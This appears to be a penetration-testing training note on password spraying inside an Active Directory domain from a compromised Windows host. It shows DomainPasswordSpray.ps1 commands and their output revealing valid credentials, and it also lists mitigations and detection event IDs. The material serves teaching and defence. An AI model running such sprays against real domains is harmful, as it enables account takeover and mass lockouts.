Setting the scene: We have gained a foothold on a Domain-Joined Windows Host and now we can conduct a Password Spray Internally from a Windows Host.

**Using DomainPasswordSpray.ps1**

```powershell
PS C:\\htb> Import-Module .\\DomainPasswordSpray.ps1
PS C:\\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

- From a Windows Host, we can also use kerbrute to help assist us in password spraying as well.

### Mitigations

- The following is a list of mitigations that may been in use when it comes to protecting from password spraying:

|**Technique**|**Description**|
|---|---|
|`Multi-factor Authentication`|Multi-factor authentication can greatly reduce the risk of password spraying attacks. Many types of multi-factor authentication exist, such as push notifications to a mobile device, a rotating One Time Password (OTP) such as Google Authenticator, RSA key, or text message confirmations. While this may prevent an attacker from gaining access to an account, certain multi-factor implementations still disclose if the username/password combination is valid. It may be possible to reuse this credential against other exposed services or applications. It is important to implement multi-factor solutions with all external portals.|
|`Restricting Access`|It is often possible to log into applications with any domain user account, even if the user does not need to access it as part of their role. In line with the principle of least privilege, access to the application should be restricted to those who require it.|
|`Reducing Impact of Successful Exploitation`|A quick win is to ensure that privileged users have a separate account for any administrative activities. Application-specific permission levels should also be implemented if possible. Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise.|
|`Password Hygiene`|Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack. Also, using a password filter to restrict common dictionary words, names of months and seasons, and variations on the company's name will make it quite difficult for an attacker to choose a valid password for spraying attempts.|
|||

### Detection

- Some indicators of external password spraing attacks include many account lockouts in a short period of time, server or application logs showing many login attempts with valid or non-existent users, many requests in a short period to a specific application or URL.
- Events that usually populate on the Domain Controller as follows:
    - Event ID 4771: Kerberos pre-authentication failed
    - Event ID 4625: An account failed to log on